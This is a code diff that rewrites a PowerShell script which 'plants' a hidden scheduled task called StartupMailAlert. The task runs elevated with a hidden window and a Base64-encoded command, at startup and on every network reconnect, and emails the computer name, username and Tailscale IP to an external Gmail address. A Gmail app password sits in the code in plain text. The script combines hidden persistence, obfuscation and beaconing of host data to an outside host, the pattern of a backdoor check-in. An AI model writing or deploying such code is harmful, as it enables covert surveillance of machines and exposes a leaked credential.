@@ -327,52 +327,125 @@ catch {
 # STARTUP EMAIL ALERT TASK
 # =========================================================
 
-$f="systemaccess91@gmail.com"
-$t="systemaccess91@gmail.com"
-$app="hmyguhczrnrzmzce"
+# This treats everything literally and avoids broken subexpression evaluations at definition time.
+$script = @'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Start-Transcript "C:\ProgramData\StartupMailAlert.log" -Append
+try {
+    # Embedded Configuration Variables
+    $f = "systemaccess91@gmail.com"
+    $t = "systemaccess91@gmail.com"
+    $app = "hmyguhczrnrzmzce"
 
-$script=@"
-try{
-Start-Sleep 15
-Invoke-WebRequest -Uri 'https://google.com' -UseBasicParsing -TimeoutSec 15|Out-Null
-`$pw=ConvertTo-SecureString '$app' -AsPlainText -Force
-`$cred=New-Object System.Management.Automation.PSCredential('$f',`$pw)
-`$tsip=(tailscale ip -4 | Select-Object -First 1)
-`$body='PC Name: '+`$env:COMPUTERNAME+'`nUsername: '+`$env:USERNAME+'`nTailscale IP: '+`$tsip+'`nTime: '+(Get-Date)
-Send-MailMessage -From '$f' -To '$t' -Subject ('PC Online Alert - '+`$env:COMPUTERNAME) -Body `$body -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential `$cred
-}catch{}
-"@
+    # 1. Gather Basic System Data
+    $pcName = if ([string]::IsNullOrEmpty($env:COMPUTERNAME)) { "UNKNOWN_PC" } else { $env:COMPUTERNAME }
+    $userName = if ([string]::IsNullOrEmpty($env:USERNAME)) { "UNKNOWN_USER" } else { $env:USERNAME }
+    
+    # 2. Gather Tailscale IP with a strict 10-second execution timeout
+    $tsip = "Not Retrieved"
+    $tsExe = "C:\Program Files\Tailscale\tailscale.exe"
+    
+    try {
+        if (Test-Path $tsExe) {
+            $psi = New-Object System.Diagnostics.ProcessStartInfo
+            $psi.FileName = $tsExe
+            $psi.Arguments = "ip -4"
+            $psi.RedirectStandardOutput = $true
+            $psi.UseShellExecute = $false
+            $psi.CreateNoWindow = $true
+            
+            $proc = [System.Diagnostics.Process]::Start($psi)
+            # Wait for up to 10 seconds for Tailscale to reply
+            if ($proc.WaitForExit(10000)) {
+                $tsip = $proc.StandardOutput.ReadToEnd().Trim()
+                if ([string]::IsNullOrEmpty($tsip)) {
+                    $tsip = "FAILED: Tailscale returned an empty IP address."
+                }
+            } else {
+                $proc.Kill()
+                $tsip = "FAILED: Tailscale command timed out after 10 seconds."
+            }
+        } else {
+            $tsip = "FAILED: Tailscale executable not found at '$tsExe'."
+        }
+    } catch {
+        $tsip = "FAILED: Error trying to read Tailscale IP ($($_.Exception.Message))"
+    }
 
-$enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
+    # 3. Construct the Email Body cleanly using string expansion
+    $body = "PC Name: $pcName`nUsername: $userName`nTailscale IP: $tsip`nTime Processed: $((Get-Date).ToString())"
 
-try{
-Unregister-ScheduledTask -TaskName 'StartupMailAlert' -Confirm:$false -ErrorAction SilentlyContinue
-}catch{}
+    # 4. Mandatory Email Delivery Loop
+    $credPw = ConvertTo-SecureString $app -AsPlainText -Force
+    $cred = New-Object System.Management.Automation.PSCredential($f, $credPw)
+    $emailSent = $false
+    $attempt = 1
 
-$service=New-Object -ComObject "Schedule.Service"
+    while (-not $emailSent) {
+        try {
+            Write-Output "Attempting to send email (Attempt #$attempt)..."
+            
+            Send-MailMessage -From $f -To $t `
+                -Subject ("PC Online Alert - " + $pcName) `
+                -Body $body `
+                -SmtpServer 'smtp.gmail.com' `
+                -Port 587 `
+                -UseSsl `
+                -Credential $cred `
+                -ErrorAction Stop
+            
+            Write-Output "Email successfully sent!"
+            $emailSent = $true
+        } catch {
+            Write-Warning "Email failed to send: $($_.Exception.Message)"
+            Write-Output "Network or SMTP error encountered. Retrying in 10 seconds..."
+            $attempt++
+            Start-Sleep -Seconds 10
+        }
+    }
+
+} catch {
+    Write-Warning "Critical script failure: $($_.Exception.Message)"
+}
+Stop-Transcript
+'@
+
+# Encode payload to Base64
+$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($script))
+
+# Unregister any existing task variant cleanly
+try {
+    Unregister-ScheduledTask -TaskName 'StartupMailAlert' -Confirm:$false -ErrorAction SilentlyContinue
+} catch {}
+
+# Initialize Task Scheduler COM interface
+$service = New-Object -ComObject "Schedule.Service"
 $service.Connect()
+$root = $service.GetFolder("\")
+$task = $service.NewTask(0)
 
-$root=$service.GetFolder("\")
+# Task Settings Configuration
+$task.Settings.Enabled = $true
+$task.Settings.Hidden = $true
+$task.Settings.StartWhenAvailable = $true
 
-$task=$service.NewTask(0)
+# Define Principal Context Explicitly
+$userContext = "$env:USERDOMAIN\$env:USERNAME"
+$task.Principal.UserId = $userContext
+$task.Principal.LogonType = 3  # TASK_LOGON_INTERACTIVE_TOKEN
+$task.Principal.RunLevel = 1   # Run with elevated privileges
 
-$task.Settings.Enabled=$true
-$task.Settings.Hidden=$true
-$task.Settings.StartWhenAvailable=$true
+# Define Action
+$action = $task.Actions.Create(0)
+$action.Path = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+$action.Arguments = "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $enc"
 
-$action=$task.Actions.Create(0)
-
-$action.Path="$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
-
-$action.Arguments="-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $enc"
-
-# Startup trigger
+# Trigger 1: Startup
 $task.Triggers.Create(8) | Out-Null
 
-# Internet reconnect trigger
-$event=$task.Triggers.Create(0)
-
-$event.Subscription=@"
+# Trigger 2: Internet Reconnect Event ID 10000
+$event = $task.Triggers.Create(0)
+$event.Subscription = @"
 <QueryList>
 <Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'>
 <Select Path='Microsoft-Windows-NetworkProfile/Operational'>
@@ -382,16 +455,16 @@ $event.Subscription=@"
 </QueryList>
 "@
 
+# Register the Task Definition
 $root.RegisterTaskDefinition(
-'StartupMailAlert',
-$task,
-6,
-$env:USERNAME,
-$null,
-3
+    'StartupMailAlert',
+    $task,
+    6,             
+    $userContext,
+    $null,
+    3              
 ) | Out-Null
 
-Write-Host ""
 Write-Host "StartupMailAlert planted successfully." -ForegroundColor Green
 
 
